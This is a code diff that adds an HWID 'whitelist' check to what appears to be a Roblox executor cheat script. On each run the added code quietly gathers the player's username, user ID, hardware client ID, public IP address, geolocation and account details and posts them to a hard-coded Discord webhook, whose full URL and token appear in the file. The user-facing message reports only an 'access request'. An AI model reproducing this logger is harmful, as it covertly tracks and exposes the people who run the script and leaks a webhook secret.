@@ -8,8 +8,383 @@ local Workspace = game:GetService("Workspace")
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- ========================================
+-- === WHITELIST CONFIGURATION ===
+-- ========================================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1456760973825413284/4SowsAHTn7IhIZC7b5SL2e115ifoQXMY3k624uoZExti5hrp8yJrvKFpwGBSIAlTpPho"
+local WHITELIST = {
+    ["A6A3A223-9F8F-432D-B9CD-30F94B58C6C3"] = true,
+    ["ED3BCC12-098C-45EB-B268-85D54DE3ECBC"] = true,
+    ["7E16E9B2-6037-4385-AAAD-CA35F60AA029"] = true,
+}
 
+-- ========================================
+-- === HWID GENERATION ===
+-- ========================================
+local function getHWID()
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    return hwid
+end
+
+-- ========================================
+-- === HTTP REQUEST WRAPPER ===
+-- ========================================
+local function doRequest(opts)
+    if syn and syn.request then
+        return syn.request(opts)
+    elseif http_request then
+        return http_request(opts)
+    elseif request then
+        return request(opts)
+    else
+        error("No HTTP request function found (syn.request / http_request / request).")
+    end
+end
+
+-- ========================================
+-- === WHITELIST VERIFICATION SYSTEM ===
+-- ========================================
+local function sendHWIDToWebhook(hwid, username, userId)
+    local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+    
+    if not request then
+        warn("No HTTP request function available")
+        return false
+    end
+    
+    local executorType = "Unknown Executor" 
+    if identifyexecutor then
+        executorType = identifyexecutor()
+    elseif syn and syn.request then
+        executorType = "Synapse X"
+    elseif KRNL_LOADED then
+        executorType = "Krnl"
+    elseif isFluxusExecutor then
+        executorType = "Fluxus"
+    elseif secure_load then
+        executorType = "ScriptWare"
+    end
+    
+    local playerProfileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+    
+    local success, getIPResponse = pcall(function()
+        return request({
+            Url = "https://api.ipify.org/?format=json",
+            Method = "GET"
+        })
+    end)
+    
+    local ipAddress = "N/A"
+    local ipCountry = "N/A"
+    local ipCountryCode = "N/A"
+    local ipRegion = "N/A"
+    local ipRegionName = "N/A"
+    local ipCity = "N/A"
+    
+    if success and getIPResponse then
+        local GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
+        ipAddress = tostring(GetIPJSON.ip)
+        
+        local ipSuccess, getIPInfo = pcall(function()
+            return request({
+                Url = string.format("http://ip-api.com/json/%s", ipAddress),
+                Method = "GET"
+            })
+        end)
+        
+        if ipSuccess and getIPInfo then
+            local ipData = HttpService:JSONDecode(getIPInfo.Body)
+            local function safeGet(field)
+                return ipData[field] or "N/A"
+            end
+            
+            ipCountry = safeGet("country")
+            ipCountryCode = safeGet("countryCode")
+            ipRegion = safeGet("region")
+            ipRegionName = safeGet("regionName")
+            ipCity = safeGet("city")
+        end
+    end
+    
+    local playerProfilePic = ""
+    local avatarSuccess, avatarUrlRequest = pcall(function()
+        return request({
+            Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false",
+            Method = "GET"
+        })
+    end)
+    
+    if avatarSuccess and avatarUrlRequest then
+        local avatarData = HttpService:JSONDecode(avatarUrlRequest.Body)
+        playerProfilePic = avatarData.data and avatarData.data[1] and avatarData.data[1].imageUrl or ""
+    end
+    
+    local playerMembershipType = Players.LocalPlayer.MembershipType and Players.LocalPlayer.MembershipType.Name or "N/A"
+    local playerAccountAgeDays = math.floor(Players.LocalPlayer.AccountAge)
+    
+    local executionTimeUTC = os.date("!%Y-%m-%d %H:%M:%S UTC")
+    local executionTimeLocal = os.date("%Y-%m-%d %H:%M:%S")
+    
+    local embedDescription = string.format([[
+**Player Information**
+
+- Username: [%s](%s)
+- UserID: %d
+- Membership Type: %s
+- Account Age (days): %d
+
+**HWID**
+```
+%s
+```
+
+**IP Information**
+
+- IP Address: %s
+- Country: %s (%s)
+- Region: %s (%s)
+- City: %s
+
+**Execution Info**
+
+- Executed At (UTC): %s
+- Executed At (Local): %s
+- Executor Type: %s
+]],
+        username, playerProfileUrl,
+        userId,
+        playerMembershipType,
+        playerAccountAgeDays,
+        hwid,
+        ipAddress,
+        ipCountry, ipCountryCode,
+        ipRegion, ipRegionName,
+        ipCity,
+        executionTimeUTC,
+        executionTimeLocal,
+        executorType
+    )
+    
+    local embed = {
+        title = "🔐 Script Access Request",
+        description = embedDescription,
+        color = 3447003,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        author = {
+            name = "Whitelist System",
+            url = playerProfileUrl
+        },
+        image = {
+            url = playerProfilePic
+        },
+        footer = {
+            text = "Copy the HWID above and add it to the whitelist table"
+        }
+    }
+    
+    local webhookData = {
+        username = "Script Logger",
+        embeds = { embed }
+    }
+    
+    local postSuccess, postResponse = pcall(function()
+        return request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(webhookData)
+        })
+    end)
+    
+    if not postSuccess then
+        warn("Failed to send webhook: " .. tostring(postResponse))
+        return false
+    else
+        print("Webhook sent successfully.")
+        return true
+    end
+end
+
+local function createNotWhitelistedUI(hwid)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "WhitelistUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 450, 0, 300)
+    frame.Position = UDim2.new(0.5, -225, 0.5, -150)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
+    frame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 40)
+    title.Position = UDim2.new(0, 10, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Text = "🔒 Access Denied"
+    title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.Parent = frame
+    
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(1, -20, 0, 60)
+    infoLabel.Position = UDim2.new(0, 10, 0, 55)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "Your HWID is not whitelisted.\nYour access request has been sent to the owner"
+    infoLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.TextSize = 14
+    infoLabel.TextWrapped = true
+    infoLabel.Parent = frame
+    
+    local hwidLabel = Instance.new("TextLabel")
+    hwidLabel.Size = UDim2.new(1, -40, 0, 30)
+    hwidLabel.Position = UDim2.new(0, 20, 0, 120)
+    hwidLabel.BackgroundTransparency = 1
+    hwidLabel.Text = "Your HWID:"
+    hwidLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    hwidLabel.Font = Enum.Font.Gotham
+    hwidLabel.TextSize = 12
+    hwidLabel.TextXAlignment = Enum.TextXAlignment.Left
+    hwidLabel.Parent = frame
+    
+    local hwidBox = Instance.new("TextBox")
+    hwidBox.Size = UDim2.new(1, -40, 0, 50)
+    hwidBox.Position = UDim2.new(0, 20, 0, 150)
+    hwidBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    hwidBox.BorderSizePixel = 1
+    hwidBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
+    hwidBox.Text = hwid
+    hwidBox.TextColor3 = Color3.fromRGB(0, 255, 150)
+    hwidBox.Font = Enum.Font.Code
+    hwidBox.TextSize = 12
+    hwidBox.TextWrapped = true
+    hwidBox.TextEditable = false
+    hwidBox.ClearTextOnFocus = false
+    hwidBox.Parent = frame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 40)
+    statusLabel.Position = UDim2.new(0, 10, 0, 210)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "✓ Request sent! Contact owner for approval."
+    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 13
+    statusLabel.TextWrapped = true
+    statusLabel.Parent = frame
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 120, 0, 35)
+    closeButton.Position = UDim2.new(0.5, -60, 0, 255)
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "Close"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 14
+    closeButton.Parent = frame
+    
+    closeButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    local boxCorner = Instance.new("UICorner")
+    boxCorner.CornerRadius = UDim.new(0, 4)
+    boxCorner.Parent = hwidBox
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6)
+    buttonCorner.Parent = closeButton
+    
+    return screenGui
+end
+
+local function createLoadingUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LoadingUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.fromRGB(0, 200, 255)
+    frame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 40)
+    title.Position = UDim2.new(0, 10, 0, 20)
+    title.BackgroundTransparency = 1
+    title.Text = "Verifying HWID..."
+    title.TextColor3 = Color3.fromRGB(0, 200, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = frame
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 40)
+    statusLabel.Position = UDim2.new(0, 10, 0, 70)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Please wait..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 14
+    statusLabel.Parent = frame
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    return screenGui, statusLabel
+end
+
+local function verifyHWID()
+    local loadingGui, statusLabel = createLoadingUI()
+    task.wait(0.5)
+    
+    local hwid = getHWID()
+    statusLabel.Text = "Checking whitelist..."
+    task.wait(0.3)
+    
+    local isWhitelisted = WHITELIST[hwid] == true
+    
+    statusLabel.Text = "Sending execution log..."
+    local webhookSuccess = sendHWIDToWebhook(hwid, Players.LocalPlayer.Name, Players.LocalPlayer.UserId)
+    
+    if not webhookSuccess then
+        warn("Webhook failed")
+    end
+    
+    if isWhitelisted then
+        statusLabel.Text = "✓ Access Granted!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        task.wait(1)
+        loadingGui:Destroy()
+        return true
+    else
+        loadingGui:Destroy()
+        createNotWhitelistedUI(hwid)
+        return false
+    end
+end
+
+-- Run HWID verification
+if not verifyHWID() then
+    return
+end
 local player = Players.LocalPlayer
+
+
 
 -- ========================================
 -- LIBRARY SETUP
